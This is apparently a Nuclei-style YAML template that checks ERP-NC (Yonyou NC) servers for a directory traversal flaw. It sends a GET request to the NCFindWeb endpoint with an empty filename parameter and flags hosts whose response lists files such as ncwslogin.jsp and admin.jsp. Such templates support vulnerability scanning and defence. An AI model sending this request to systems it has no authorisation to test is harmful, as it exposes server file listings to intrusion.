id: erp-nc-directory-traversal
info:
  author: pikpikcu
  name: ERP-NC directory traversal
  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: high
  tags: lfi,erp-nc
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Client
    - ncwslogin.jsp
    - admin.jsp
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename='
